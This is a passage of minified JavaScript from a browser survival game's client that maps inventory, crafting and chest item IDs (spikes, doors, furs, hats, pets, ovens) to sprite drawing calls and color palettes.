                    }], .45, ["#3ba578", "#4eb687", "#3da34d"], .5),
                    sprite[ze.CRAFT_WALL] = sprite[ze.INV_WALL],
                    sprite[ze.INV_SPIKE] = O(1, [{
                        f: ii,
                        x: 0,
                        y: 0,
                        a: 1,
                        r: 0,
                        c: ["#0d1b1c", "#5f6061", "#939393", "#4c3a15", "#634828", "#564021", "#634828", "#4c3a15"]
                    }], .35, ["#3ba578", "#4eb687", "#3da34d"], .5),
                    sprite[ze.CRAFT_SPIKE] = sprite[ze.INV_SPIKE],
                    sprite[ze.INV_GOLD_SPIKE] = O(1, [{
                        f: ri,
                        x: 0,
                        y: 0,
                        a: 1,
                        r: 0,
                        c: ["#0d1b1c", "#5f6061", "#939393", "#877d36", "#a08f47", "#a7983c", "#b29e4d", "#c1b06b"]
                    }], .35, ["#3ba578", "#4eb687", "#3da34d"], .5),
                    sprite[ze.CRAFT_GOLD_SPIKE] = sprite[ze.INV_GOLD_SPIKE],
                    sprite[ze.INV_DIAMOND_SPIKE] = O(1, [{
                        f: ri,
                        x: 0,
                        y: 0,
                        a: 1,
                        r: 0,
                        c: ["#0d1b1c", "#7d8b90", "#9facaa", "#5cc5ce", "#89d1d4", "#86d0d1", "#95d5d8", "#e0f2f6", "#b3e0e3"]
                    }], .35, ["#3ba578", "#4eb687", "#3da34d"], .5),
                    sprite[ze.CRAFT_DIAMOND_SPIKE] = sprite[ze.INV_DIAMOND_SPIKE],
                    sprite[ze.INV_STONE_SPIKE] = O(1, [{
                        f: ni,
                        x: 0,
                        y: 0,
                        a: 1,
                        r: 0,
                        c: ["#0d1b1c", "#5f6061", "#939393", "#6a7570", "#939995", "#9baaa3", "#adbcb5", "#8a938e"]
                    }], .35, ["#3ba578", "#4eb687", "#3da34d"], .5),
                    sprite[ze.CRAFT_STONE_SPIKE] = sprite[ze.INV_STONE_SPIKE],
                    sprite[ze.INV_AMETHYST_SPIKE] = O(1, [{
                        f: ni,
                        x: 0,
                        y: 0,
                        a: 1,
                        r: 0,
                        c: ["#0d1b1c", "#5f6061", "#939393", "#b15ecf", "#8c29aa", "#c26de0", "#af59cd", "#d588f1"]
                    }], .35, ["#3ba578", "#4eb687", "#3da34d"], .5),
                    sprite[ze.CRAFT_AMETHYST_SPIKE] = sprite[ze.INV_AMETHYST_SPIKE],
                    sprite[ze.INV_DOOR_WOOD_CLOSE] = O(1, [{
                        f: yt,
                        x: 0,
                        y: 0,
                        a: 1,
                        r: 0,
                        c: ["#0d1b1c", "#4c3b19", "#574122", "#644928", "#574122", "#735534"]
                    }], .6, ["#3ba578", "#4eb687", "#3da34d"], .5),
                    sprite[ze.CRAFT_DOOR_WOOD_CLOSE] = sprite[ze.INV_DOOR_WOOD_CLOSE],
                    sprite[ze.INV_DOOR_STONE_CLOSE] = O(1, [{
                        f: Ht,
                        x: 0,
                        y: 0,
                        a: 1,
                        r: 0,
                        c: ["#0d1b1c", "#6a7570", "#939995", "#9baaa3", "#8a938e", "#adbcb5"]
                    }], .6, ["#3ba578", "#4eb687", "#3da34d"], .5),
                    sprite[ze.CRAFT_DOOR_STONE_CLOSE] = sprite[ze.INV_DOOR_STONE_CLOSE],
                    sprite[ze.INV_DOOR_AMETHYST_CLOSE] = O(1, [{
                        f: Ht,
                        x: 0,
                        y: 0,
                        a: 1,
                        r: 0,
                        c: ["#0d1b1c", "#b15ecf", "#8c29aa", "#c26de0", "#af59cd", "#d588f1"]
                    }], .6, ["#3ba578", "#4eb687", "#3da34d"], .5),
                    sprite[ze.CRAFT_DOOR_AMETHYST_CLOSE] = sprite[ze.INV_DOOR_AMETHYST_CLOSE],
                    sprite[ze.INV_DOOR_GOLD_CLOSE] = O(1, [{
                        f: Pt,
                        x: 0,
                        y: 0,
                        a: 1,
                        r: 0,
                        c: ["#0d1b1c", "#877d36", "#a08f47", "#a7983c", "#9a8636", "#c1b06b"]
                    }], .6, ["#3ba578", "#4eb687", "#3da34d"], .5),
                    sprite[ze.CRAFT_DOOR_GOLD_CLOSE] = sprite[ze.INV_DOOR_GOLD_CLOSE],
                    sprite[ze.INV_DOOR_DIAMOND_CLOSE] = O(1, [{
                        f: wt,
                        x: 0,
                        y: 0,
                        a: 1,
                        r: 0,
                        c: ["#0d1b1c", "#5cc5ce", "#89d1d4", "#86d0d1", "#95d5d8", "#e0f2f6", "#b3e0e3"]
                    }], .6, ["#3ba578", "#4eb687", "#3da34d"], .5),
                    sprite[ze.CRAFT_DOOR_DIAMOND_CLOSE] = sprite[ze.INV_DOOR_DIAMOND_CLOSE],
                    sprite[ze.INV_CHEST] = O(1, [{
                        f: Qt,
                        x: 0,
                        y: 2,
                        a: 1,
                        r: 0,
                        c: ["#133a2b", "#9e8838", "#c4a23a", "#4c3b19", "#614627", "#614627", "#614627", "#c4a23a", "#c4a23a", "#c4a23a"]
                    }], .35, ["#3ba578", "#4eb687", "#3da34d"], .5),
                    sprite[ze.CRAFT_CHEST] = sprite[ze.INV_CHEST],
                    sprite[ze.INV_MEAT] = O(1, [{
                        f: R1,
                        x: 0,
                        y: -3,
                        a: 1,
                        r: 0,
                        c: ["#dd5d57", "#ffffff", "#5e5d5e", "#ffffff"]
                    }], 1.4, ["#3ba578", "#4eb687", "#3da34d"], .5),
                    sprite[ze.INV_COOKED_MEAT] = O(1, [{
                        f: R1,
                        x: 0,
                        y: -3,
                        a: 1,
                        r: 0,
                        c: ["#602920", "#844f49", "#5e5d5e", "#d3ccc7"]
                    }], 1.4, ["#3ba578", "#4eb687", "#3da34d"], .5),
                    sprite[ze.CRAFT_COOKED_MEAT] = sprite[ze.INV_COOKED_MEAT],
                    sprite[ze.INV_CORD] = O(1, [{
                        f: f1,
                        x: -3,
                        y: -3,
                        a: 1,
                        r: 0,
                        c: ["#cec0c4", "#ffffff", "#6d6768"]
                    }], .9, ["#3ba578", "#4eb687", "#3da34d"], .5),
                    sprite[ze.INV_BLUE_CORD] = O(1, [{
                        f: f1,
                        x: -3,
                        y: -3,
                        a: 1,
                        r: 0,
                        c: ["#d4e9ec", "#37b1d7", "#506c71"]
                    }], .9, ["#3ba578", "#4eb687", "#3da34d"], .5),
                    sprite[ze.CRAFT_BLUE_CORD] = sprite[ze.INV_BLUE_CORD],
                    sprite[ze.INV_FUR] = O(1, [{
                        f: $t,
                        x: -3,
                        y: -3,
                        a: 1,
                        r: 0,
                        c: ["#ef96be", "#ffffff"]
                    }], .5, ["#2b5c48", "#2b5c48", "#2b5c48"], .5),
                    sprite[ze.INV_FUR_BOAR] = O(1, [{
                        f: $t,
                        x: -3,
                        y: -3,
                        a: 1,
                        r: 0,
                        c: ["#55423e", "#ffffff"]
                    }], .5, ["#2b5c48", "#2b5c48", "#2b5c48"], .5),
                    sprite[ze.INV_SPECIAL_FUR] = O(1, [{
                        f: ft,
                        x: 0,
                        y: 0,
                        a: 1,
                        r: 0,
                        c: ["#ffffff", "#e7e2e2", "#b35c46", "#a34d37"]
                    }], .25, ["#2b5c48", "#2b5c48", "#2b5c48"], .5),
                    sprite[ze.INV_SPECIAL_FUR_2] = O(1, [{
                        f: ft,
                        x: 0,
                        y: 0,
                        a: 1,
                        r: 0,
                        c: ["#14151b", "#000000", "#b35c46", "#a34d37"]
                    }], .25, ["#2b5c48", "#2b5c48", "#2b5c48"], .5),
                    sprite[ze.INV_KRAKEN_SKIN] = O(1, [{
                        f: $t,
                        x: 0,
                        y: 0,
                        a: 1,
                        r: 0,
                        c: ["#201851", "#b6222a"]
                    }], .5, ["#2b5c48", "#2b5c48", "#2b5c48"], .5),
                    sprite[ze.INV_FUR_WOLF] = O(1, [{
                        f: $t,
                        x: -3,
                        y: -3,
                        a: 1,
                        r: 0,
                        c: ["#231f20", "#b6222a"]
                    }], .5, ["#2b5c48", "#2b5c48", "#2b5c48"], .5),
                    sprite[ze.INV_FUR_WINTER] = O(1, [{
                        f: $t,
                        x: -3,
                        y: -3,
                        a: 1,
                        r: 0,
                        c: ["#ffffff", "#b6222a"]
                    }], .5, ["#2b5c48", "#2b5c48", "#2b5c48"], .5),
                    sprite[ze.INV_EARMUFFS] = O(1, [{
                        f: ei,
                        x: 0,
                        y: 0,
                        a: 1,
                        r: 0,
                        c: ["#f9efeb", "#dfd1cb", "#3e3c25", "#4d4a2e"]
                    }], .4, ["#35b1b5", "#46c2c9", "#33b4e4"], .5),
                    sprite[ze.CRAFT_EARMUFFS] = sprite[ze.INV_EARMUFFS],
                    sprite[ze.INV_COAT] = O(1, [{
                        f: Wt,
                        x: 0,
                        y: 0,
                        a: 1,
                        r: 0,
                        c: ["#3e3c25", "#4d4a2e", "#f9efeb", "#dfd1cb"]
                    }], .4, ["#35b1b5", "#46c2c9", "#33b4e4"], .5),
                    sprite[ze.CRAFT_COAT] = sprite[ze.INV_COAT],
                    sprite[ze.INV_CAP_SCARF] = O(1, [{
                        f: ti,
                        x: 0,
                        y: 0,
                        a: 1,
                        r: 0,
                        c: ["#171a19", "#dee7e7", "#b8cccb", "#ffffff", "#e3e8e8"]
                    }], .4, ["#35b1b5", "#46c2c9", "#33b4e4"], .5),
                    sprite[ze.CRAFT_CAP_SCARF] = sprite[ze.INV_CAP_SCARF],
                    sprite[ze.INV_CHRISTMAS_HAT] = O(1, [{
                        f: W1,
                        x: 0,
                        y: 5,
                        a: 1,
                        r: 0,
                        c: ["#171a19", "#c5232c", "#84191d", "#a72027", "#fef4f4", "#e9dad9"]
                    }], .35, ["#35b1b5", "#46c2c9", "#33b4e4"], .5),
                    sprite[ze.CHEST_CHRISTMAS_HAT] = sprite[ze.INV_CHRISTMAS_HAT],
                    sprite[ze.INV_ELF_HAT] = O(1, [{
                        f: w1,
                        x: 0,
                        y: 5,
                        a: 1,
                        r: 0,
                        c: ["#171a19", "#0f964c", "#106e3b", "#138344", "#fef4f4", "#e9dad9", "#C5232C", "#A92D2D"]
                    }], .35, ["#35b1b5", "#46c2c9", "#33b4e4"], .5),
                    sprite[ze.CHEST_ELF_HAT] = sprite[ze.INV_ELF_HAT],
                    sprite[ze.INV_BANDAGE] = O(1, [{
                        f: L1,
                        x: -2,
                        y: -2,
                        a: 1,
                        r: 0,
                        c: ["#ffffff", "#cec0c4"]
                    }], .35, ["#3ba578", "#4eb687", "#3da34d"], .5),
                    sprite[ze.CRAFT_BANDAGE] = sprite[ze.INV_BANDAGE],
                    sprite[ze.INV_BAG] = [],
                    sprite[ze.INV_BAG][0] = IMAGES.INV_BAG_OUT,
                    sprite[ze.INV_BAG][1] = IMAGES.INV_BAG_IN,
                    sprite[ze.INV_BAG][2] = IMAGES.INV_BAG_CLICK,
                    sprite[ze.CRAFT_BAG] = sprite[ze.INV_BAG],
                    sprite[ze.INV_PITCHFORK] = [],
                    sprite[ze.INV_PITCHFORK][0] = IMAGES.INV_PITCHFORK_OUT,
                    sprite[ze.INV_PITCHFORK][1] = IMAGES.INV_PITCHFORK_IN,
                    sprite[ze.INV_PITCHFORK][2] = IMAGES.INV_PITCHFORK_CLICK,
                    sprite[ze.CRAFT_PITCHFORK] = sprite[ze.INV_PITCHFORK],
                    sprite[ze.CHEST_PITCHFORK] = sprite[ze.INV_PITCHFORK],
                    sprite[ze.INV_PITCHFORK2] = [],
                    sprite[ze.INV_PITCHFORK2][0] = IMAGES.INV_PITCHFORK2_OUT,
                    sprite[ze.INV_PITCHFORK2][1] = IMAGES.INV_PITCHFORK2_IN,
                    sprite[ze.INV_PITCHFORK2][2] = IMAGES.INV_PITCHFORK2_CLICK,
                    sprite[ze.CRAFT_PITCHFORK2] = sprite[ze.INV_PITCHFORK2],
                    sprite[ze.CHEST_PITCHFORK2] = sprite[ze.INV_PITCHFORK2],
                    sprite[ze.INV_PITCHFORK_PART] = [],
                    sprite[ze.INV_PITCHFORK_PART][0] = IMAGES.INV_PITCHFORK_PART_CLICK,
                    sprite[ze.INV_PITCHFORK_PART][1] = IMAGES.INV_PITCHFORK_PART_CLICK,
                    sprite[ze.INV_PITCHFORK_PART][2] = IMAGES.INV_PITCHFORK_PART_CLICK,
                    sprite[ze.CHEST_PITCHFORK_PART] = sprite[ze.INV_PITCHFORK_PART],
                    sprite[ze.INV_PILOT_HELMET] = [],
                    sprite[ze.INV_PILOT_HELMET][0] = IMAGES.INV_PILOT_HELMET_OUT,
                    sprite[ze.INV_PILOT_HELMET][1] = IMAGES.INV_PILOT_HELMET_IN,
                    sprite[ze.INV_PILOT_HELMET][2] = IMAGES.INV_PILOT_HELMET_CLICK,
                    sprite[ze.CRAFT_PILOT_HELMET] = sprite[ze.INV_PILOT_HELMET],
                    sprite[ze.CHEST_PILOT_HELMET] = sprite[ze.INV_PILOT_HELMET],
                    sprite[ze.INV_PILOT_GLASSES] = [],
                    sprite[ze.INV_PILOT_GLASSES][0] = IMAGES.INV_PILOT_GLASSES_CLICK,
                    sprite[ze.INV_PILOT_GLASSES][1] = IMAGES.INV_PILOT_GLASSES_CLICK,
                    sprite[ze.INV_PILOT_GLASSES][2] = IMAGES.INV_PILOT_GLASSES_CLICK,
                    sprite[ze.CHEST_PILOT_GLASSES] = sprite[ze.INV_PILOT_GLASSES],
                    sprite[ze.INV_WOOD_TOWER] = [],
                    sprite[ze.INV_WOOD_TOWER][0] = IMAGES.INV_WOOD_TOWER_OUT,
                    sprite[ze.INV_WOOD_TOWER][1] = IMAGES.INV_WOOD_TOWER_IN,
                    sprite[ze.INV_WOOD_TOWER][2] = IMAGES.INV_WOOD_TOWER_CLICK,
                    sprite[ze.CRAFT_WOOD_TOWER] = sprite[ze.INV_WOOD_TOWER],
                    sprite[ze.CHEST_WOOD_TOWER] = sprite[ze.INV_WOOD_TOWER],
                    sprite[ze.INV_WOOD_DOOR_SPIKE] = [],
                    sprite[ze.INV_WOOD_DOOR_SPIKE][0] = IMAGES.INV_WOOD_DOOR_SPIKE_OUT,
                    sprite[ze.INV_WOOD_DOOR_SPIKE][1] = IMAGES.INV_WOOD_DOOR_SPIKE_IN,
                    sprite[ze.INV_WOOD_DOOR_SPIKE][2] = IMAGES.INV_WOOD_DOOR_SPIKE_CLICK,
                    sprite[ze.CRAFT_WOOD_DOOR_SPIKE] = sprite[ze.INV_WOOD_DOOR_SPIKE],
                    sprite[ze.CHEST_WOOD_DOOR_SPIKE] = sprite[ze.INV_WOOD_DOOR_SPIKE],
                    sprite[ze.INV_STONE_DOOR_SPIKE] = [],
                    sprite[ze.INV_STONE_DOOR_SPIKE][0] = IMAGES.INV_STONE_DOOR_SPIKE_OUT,
                    sprite[ze.INV_STONE_DOOR_SPIKE][1] = IMAGES.INV_STONE_DOOR_SPIKE_IN,
                    sprite[ze.INV_STONE_DOOR_SPIKE][2] = IMAGES.INV_STONE_DOOR_SPIKE_CLICK,
                    sprite[ze.CRAFT_STONE_DOOR_SPIKE] = sprite[ze.INV_STONE_DOOR_SPIKE],
                    sprite[ze.CHEST_STONE_DOOR_SPIKE] = sprite[ze.INV_STONE_DOOR_SPIKE],
                    sprite[ze.INV_GOLD_DOOR_SPIKE] = [],
                    sprite[ze.INV_GOLD_DOOR_SPIKE][0] = IMAGES.INV_GOLD_DOOR_SPIKE_OUT,
                    sprite[ze.INV_GOLD_DOOR_SPIKE][1] = IMAGES.INV_GOLD_DOOR_SPIKE_IN,
                    sprite[ze.INV_GOLD_DOOR_SPIKE][2] = IMAGES.INV_GOLD_DOOR_SPIKE_CLICK,
                    sprite[ze.CRAFT_GOLD_DOOR_SPIKE] = sprite[ze.INV_GOLD_DOOR_SPIKE],
                    sprite[ze.CHEST_GOLD_DOOR_SPIKE] = sprite[ze.INV_GOLD_DOOR_SPIKE],
                    sprite[ze.INV_DIAMOND_DOOR_SPIKE] = [],
                    sprite[ze.INV_DIAMOND_DOOR_SPIKE][0] = IMAGES.INV_DIAMOND_DOOR_SPIKE_OUT,
                    sprite[ze.INV_DIAMOND_DOOR_SPIKE][1] = IMAGES.INV_DIAMOND_DOOR_SPIKE_IN,
                    sprite[ze.INV_DIAMOND_DOOR_SPIKE][2] = IMAGES.INV_DIAMOND_DOOR_SPIKE_CLICK,
                    sprite[ze.CRAFT_DIAMOND_DOOR_SPIKE] = sprite[ze.INV_DIAMOND_DOOR_SPIKE],
                    sprite[ze.CHEST_DIAMOND_DOOR_SPIKE] = sprite[ze.INV_DIAMOND_DOOR_SPIKE],
                    sprite[ze.INV_AMETHYST_DOOR_SPIKE] = [],
                    sprite[ze.INV_AMETHYST_DOOR_SPIKE][0] = IMAGES.INV_AMETHYST_DOOR_SPIKE_OUT,
                    sprite[ze.INV_AMETHYST_DOOR_SPIKE][1] = IMAGES.INV_AMETHYST_DOOR_SPIKE_IN,
                    sprite[ze.INV_AMETHYST_DOOR_SPIKE][2] = IMAGES.INV_AMETHYST_DOOR_SPIKE_CLICK,
                    sprite[ze.CRAFT_AMETHYST_DOOR_SPIKE] = sprite[ze.INV_AMETHYST_DOOR_SPIKE],
                    sprite[ze.CHEST_AMETHYST_DOOR_SPIKE] = sprite[ze.INV_AMETHYST_DOOR_SPIKE],
                    sprite[ze.INV_REIDITE_DOOR_SPIKE] = [],
                    sprite[ze.INV_REIDITE_DOOR_SPIKE][0] = IMAGES.INV_REIDITE_DOOR_SPIKE_OUT,
                    sprite[ze.INV_REIDITE_DOOR_SPIKE][1] = IMAGES.INV_REIDITE_DOOR_SPIKE_IN,
                    sprite[ze.INV_REIDITE_DOOR_SPIKE][2] = IMAGES.INV_REIDITE_DOOR_SPIKE_CLICK,
                    sprite[ze.CRAFT_REIDITE_DOOR_SPIKE] = sprite[ze.INV_REIDITE_DOOR_SPIKE],
                    sprite[ze.CHEST_REIDITE_DOOR_SPIKE] = sprite[ze.INV_REIDITE_DOOR_SPIKE],
                    sprite[ze.INV_REIDITE_DOOR] = [],
                    sprite[ze.INV_REIDITE_DOOR][0] = IMAGES.INV_REIDITE_DOOR_OUT,
                    sprite[ze.INV_REIDITE_DOOR][1] = IMAGES.INV_REIDITE_DOOR_IN,
                    sprite[ze.INV_REIDITE_DOOR][2] = IMAGES.INV_REIDITE_DOOR_CLICK,
                    sprite[ze.CRAFT_REIDITE_DOOR] = sprite[ze.INV_REIDITE_DOOR],
                    sprite[ze.CHEST_REIDITE_DOOR] = sprite[ze.INV_REIDITE_DOOR],
                    sprite[ze.INV_REIDITE_SPIKE] = [],
                    sprite[ze.INV_REIDITE_SPIKE][0] = IMAGES.INV_REIDITE_SPIKE_OUT,
                    sprite[ze.INV_REIDITE_SPIKE][1] = IMAGES.INV_REIDITE_SPIKE_IN,
                    sprite[ze.INV_REIDITE_SPIKE][2] = IMAGES.INV_REIDITE_SPIKE_CLICK,
                    sprite[ze.CRAFT_REIDITE_SPIKE] = sprite[ze.INV_REIDITE_SPIKE],
                    sprite[ze.CHEST_REIDITE_SPIKE] = sprite[ze.INV_REIDITE_SPIKE],
                    sprite[ze.INV_REIDITE_WALL] = [],
                    sprite[ze.INV_REIDITE_WALL][0] = IMAGES.INV_REIDITE_WALL_OUT,
                    sprite[ze.INV_REIDITE_WALL][1] = IMAGES.INV_REIDITE_WALL_IN,
                    sprite[ze.INV_REIDITE_WALL][2] = IMAGES.INV_REIDITE_WALL_CLICK,
                    sprite[ze.CRAFT_REIDITE_WALL] = sprite[ze.INV_REIDITE_WALL],
                    sprite[ze.CHEST_REIDITE_WALL] = sprite[ze.INV_REIDITE_WALL],
                    sprite[ze.INV_PENGUIN_FEATHER] = [],
                    sprite[ze.INV_PENGUIN_FEATHER][0] = IMAGES.INV_PENGUIN_FEATHER,
                    sprite[ze.INV_PENGUIN_FEATHER][1] = IMAGES.INV_PENGUIN_FEATHER,
                    sprite[ze.INV_PENGUIN_FEATHER][2] = IMAGES.INV_PENGUIN_FEATHER,
                    sprite[ze.CRAFT_PENGUIN_FEATHER] = sprite[ze.INV_PENGUIN_FEATHER],
                    sprite[ze.CHEST_PENGUIN_FEATHER] = sprite[ze.INV_PENGUIN_FEATHER],
                    sprite[ze.INV_HAWK_FEATHER] = [],
                    sprite[ze.INV_HAWK_FEATHER][0] = IMAGES.INV_HAWK_FEATHER,
                    sprite[ze.INV_HAWK_FEATHER][1] = IMAGES.INV_HAWK_FEATHER,
                    sprite[ze.INV_HAWK_FEATHER][2] = IMAGES.INV_HAWK_FEATHER,
                    sprite[ze.CRAFT_HAWK_FEATHER] = sprite[ze.INV_HAWK_FEATHER],
                    sprite[ze.CHEST_HAWK_FEATHER] = sprite[ze.INV_HAWK_FEATHER],
                    sprite[ze.INV_VULTURE_FEATHER] = [],
                    sprite[ze.INV_VULTURE_FEATHER][0] = IMAGES.INV_VULTURE_FEATHER,
                    sprite[ze.INV_VULTURE_FEATHER][1] = IMAGES.INV_VULTURE_FEATHER,
                    sprite[ze.INV_VULTURE_FEATHER][2] = IMAGES.INV_VULTURE_FEATHER,
                    sprite[ze.CRAFT_VULTURE_FEATHER] = sprite[ze.INV_VULTURE_FEATHER],
                    sprite[ze.CHEST_VULTURE_FEATHER] = sprite[ze.INV_VULTURE_FEATHER],
                    sprite[ze.INV_EMERALD] = [],
                    sprite[ze.INV_EMERALD][0] = IMAGES.INV_EMERALD,
                    sprite[ze.INV_EMERALD][1] = IMAGES.INV_EMERALD,
                    sprite[ze.INV_EMERALD][2] = IMAGES.INV_EMERALD,
                    sprite[ze.CHEST_EMERALD] = sprite[ze.INV_EMERALD],
                    sprite[ze.INV_SADDLE] = [],
                    sprite[ze.INV_SADDLE][0] = IMAGES.INV_SADDLE_OUT,
                    sprite[ze.INV_SADDLE][1] = IMAGES.INV_SADDLE_IN,
                    sprite[ze.INV_SADDLE][2] = IMAGES.INV_SADDLE_CLICK,
                    sprite[ze.CRAFT_SADDLE] = sprite[ze.INV_SADDLE],
                    sprite[ze.CHEST_SADDLE] = sprite[ze.INV_SADDLE],
                    sprite[ze.INV_WAND1] = [],
                    sprite[ze.INV_WAND1][0] = IMAGES.INV_WAND1_OUT,
                    sprite[ze.INV_WAND1][1] = IMAGES.INV_WAND1_IN,
                    sprite[ze.INV_WAND1][2] = IMAGES.INV_WAND1_CLICK,
                    sprite[ze.CRAFT_WAND1] = sprite[ze.INV_WAND1],
                    sprite[ze.CHEST_WAND1] = sprite[ze.INV_WAND1],
                    sprite[ze.INV_WAND2] = [],
                    sprite[ze.INV_WAND2][0] = IMAGES.INV_WAND2_OUT,
                    sprite[ze.INV_WAND2][1] = IMAGES.INV_WAND2_IN,
                    sprite[ze.INV_WAND2][2] = IMAGES.INV_WAND2_CLICK,
                    sprite[ze.CRAFT_WAND2] = sprite[ze.INV_WAND2],
                    sprite[ze.CHEST_WAND2] = sprite[ze.INV_WAND2],
                    sprite[ze.INV_MOUNT_BOAR] = [],
                    sprite[ze.INV_MOUNT_BOAR][0] = IMAGES.INV_MOUNT_BOAR_OUT,
                    sprite[ze.INV_MOUNT_BOAR][1] = IMAGES.INV_MOUNT_BOAR_IN,
                    sprite[ze.INV_MOUNT_BOAR][2] = IMAGES.INV_MOUNT_BOAR_CLICK,
                    sprite[ze.CRAFT_MOUNT_BOAR] = sprite[ze.INV_MOUNT_BOAR],
                    sprite[ze.CHEST_MOUNT_BOAR] = sprite[ze.INV_MOUNT_BOAR],
                    sprite[ze.INV_CRAB_BOSS] = [],
                    sprite[ze.INV_CRAB_BOSS][0] = IMAGES.INV_CRAB_BOSS_OUT,
                    sprite[ze.INV_CRAB_BOSS][1] = IMAGES.INV_CRAB_BOSS_IN,
                    sprite[ze.INV_CRAB_BOSS][2] = IMAGES.INV_CRAB_BOSS_CLICK,
                    sprite[ze.CRAFT_CRAB_BOSS] = sprite[ze.INV_CRAB_BOSS],
                    sprite[ze.CHEST_CRAB_BOSS] = sprite[ze.INV_CRAB_BOSS],
                    sprite[ze.INV_HAWK] = [],
                    sprite[ze.INV_HAWK][0] = IMAGES.INV_HAWK_OUT,
                    sprite[ze.INV_HAWK][1] = IMAGES.INV_HAWK_IN,
                    sprite[ze.INV_HAWK][2] = IMAGES.INV_HAWK_CLICK,
                    sprite[ze.CRAFT_HAWK] = sprite[ze.INV_HAWK],
                    sprite[ze.CHEST_HAWK] = sprite[ze.INV_HAWK],
                    sprite[ze.INV_VULTURE] = [],
                    sprite[ze.INV_VULTURE][0] = IMAGES.INV_VULTURE_OUT,
                    sprite[ze.INV_VULTURE][1] = IMAGES.INV_VULTURE_IN,
                    sprite[ze.INV_VULTURE][2] = IMAGES.INV_VULTURE_CLICK,
                    sprite[ze.CRAFT_VULTURE] = sprite[ze.INV_VULTURE],
                    sprite[ze.CHEST_VULTURE] = sprite[ze.INV_VULTURE],
                    sprite[ze.INV_TURBAN1] = [],
                    sprite[ze.INV_TURBAN1][0] = IMAGES.INV_TURBAN1_OUT,
                    sprite[ze.INV_TURBAN1][1] = IMAGES.INV_TURBAN1_IN,
                    sprite[ze.INV_TURBAN1][2] = IMAGES.INV_TURBAN1_CLICK,
                    sprite[ze.CRAFT_TURBAN1] = sprite[ze.INV_TURBAN1],
                    sprite[ze.CHEST_TURBAN1] = sprite[ze.INV_TURBAN1],
                    sprite[ze.INV_TURBAN2] = [],
                    sprite[ze.INV_TURBAN2][0] = IMAGES.INV_TURBAN2_OUT,
                    sprite[ze.INV_TURBAN2][1] = IMAGES.INV_TURBAN2_IN,
                    sprite[ze.INV_TURBAN2][2] = IMAGES.INV_TURBAN2_CLICK,
                    sprite[ze.CRAFT_TURBAN2] = sprite[ze.INV_TURBAN2],
                    sprite[ze.CHEST_TURBAN2] = sprite[ze.INV_TURBAN2],
                    sprite[ze.INV_PLANE] = [],
                    sprite[ze.INV_PLANE][0] = IMAGES.INV_PLANE_OUT,
                    sprite[ze.INV_PLANE][1] = IMAGES.INV_PLANE_IN,
                    sprite[ze.INV_PLANE][2] = IMAGES.INV_PLANE_CLICK,
                    sprite[ze.CRAFT_PLANE] = sprite[ze.INV_PLANE],
                    sprite[ze.CHEST_PLANE] = sprite[ze.INV_PLANE],
                    sprite[ze.INV_BABY_DRAGON] = [],
                    sprite[ze.INV_BABY_DRAGON][0] = IMAGES.INV_BABY_DRAGON_OUT,
                    sprite[ze.INV_BABY_DRAGON][1] = IMAGES.INV_BABY_DRAGON_IN,
                    sprite[ze.INV_BABY_DRAGON][2] = IMAGES.INV_BABY_DRAGON_CLICK,
                    sprite[ze.CRAFT_BABY_DRAGON] = sprite[ze.INV_BABY_DRAGON],
                    sprite[ze.CHEST_BABY_DRAGON] = sprite[ze.INV_BABY_DRAGON],
                    sprite[ze.INV_BABY_MAMMOTH] = [],
                    sprite[ze.INV_BABY_MAMMOTH][0] = IMAGES.INV_BABY_MAMMOTH_OUT,
                    sprite[ze.INV_BABY_MAMMOTH][1] = IMAGES.INV_BABY_MAMMOTH_IN,
                    sprite[ze.INV_BABY_MAMMOTH][2] = IMAGES.INV_BABY_MAMMOTH_CLICK,
                    sprite[ze.CRAFT_BABY_MAMMOTH] = sprite[ze.INV_BABY_MAMMOTH],
                    sprite[ze.CHEST_BABY_MAMMOTH] = sprite[ze.INV_BABY_MAMMOTH],
                    sprite[ze.INV_BABY_LAVA] = [],
                    sprite[ze.INV_BABY_LAVA][0] = IMAGES.INV_BABY_LAVA_OUT,
                    sprite[ze.INV_BABY_LAVA][1] = IMAGES.INV_BABY_LAVA_IN,
                    sprite[ze.INV_BABY_LAVA][2] = IMAGES.INV_BABY_LAVA_CLICK,
                    sprite[ze.CRAFT_BABY_LAVA] = sprite[ze.INV_BABY_LAVA],
                    sprite[ze.CHEST_BABY_LAVA] = sprite[ze.INV_BABY_LAVA],
                    sprite[ze.INV_BREAD_OVEN] = O(1, [{
                        f: r0,
                        x: 0,
                        y: 0,
                        a: 1,
                        r: 0,
                        c: ["#0d1b1c", "#515C57", "#3A4942", "#68736F", "#C1C0C0", "#be8d50", "#7d5234", "#222825", "#4D5752", "#e48727", "#d4a872", "#232a27"]
                    }, {
                        f: o0,
                        x: 0,
                        y: 0,
                        a: 1,
                        r: 0,
                        c: ["#e4c027"]
                    }], .14, ["#3ba578", "#4eb687", "#3da34d"], .5),
                    sprite[ze.CRAFT_BREAD_OVEN] = sprite[ze.INV_BREAD_OVEN],
                    sprite[ze.INV_FURNACE] = O(1, [{
                        f: zt,
                        x: 0,
                        y: 0,
                        a: 1,
                        r: 0,
                        c: ["#0d1b1c", "#939393", "#5f6061", "#c0c0c0", "#ffad22", "#fffdd5", "#fee764"]
                    }], .18, ["#3ba578", "#4eb687", "#3da34d"], .5),
                    sprite[ze.CRAFT_FURNACE] = sprite[ze.INV_FURNACE],
                    sprite[ze.INV_BED] = O(1, [{
                        f: Kt,
                        x: 0,
                        y: 0,
                        a: 1,
                        r: 0,
                        c: ["#0d1b1c", "#554139", "#3f332a", "#261912", "#eee6c5", "#d1c599", "#554139", "#3f332a", "#86509b", "#703a99", "#ded4b4", "#d6ceab", "#c796c2", "#bc83b7", "#ffffff", "#87519c", "#703e94", "#3eb67f", "#218f65", "#efe7c5", "#d093c4"]
                    }], .32, ["#3ba578", "#4eb687", "#3da34d"], .5),
                    sprite[ze.CRAFT_BED] = sprite[ze.INV_BED],
                    sprite[ze.CHEST_BED] = sprite[ze.INV_BED],
                    sprite[ze.INV_CRAB_LOOT] = O(1, [{
                        f: kt,
                        x: 0,
                        y: 0,
                        a: 1,
                        r: 0,
                        c: ["#0d1b1c", "#c04933", "#a33e2b", "#ee593d", "#c04933"]
                    }], .17, ["#3ba578", "#4eb687", "#3da34d"], .5),
                    sprite[ze.CHEST_CRAB_LOOT] = sprite[ze.INV_CRAB_LOOT],
                    sprite[ze.INV_CRAB_SPEAR] = O(1, [{
                        f: Yt,
                        x: 2,
                        y: 0,
                        a: 1,
                        r: Math.PI / 5,
                        c: ["#0d1b1c", "#58452b", "#47341d", "#ee593d", "#c04933", "#c04933", "#a33e2b", "#c3be9a", "#7f6d52"]
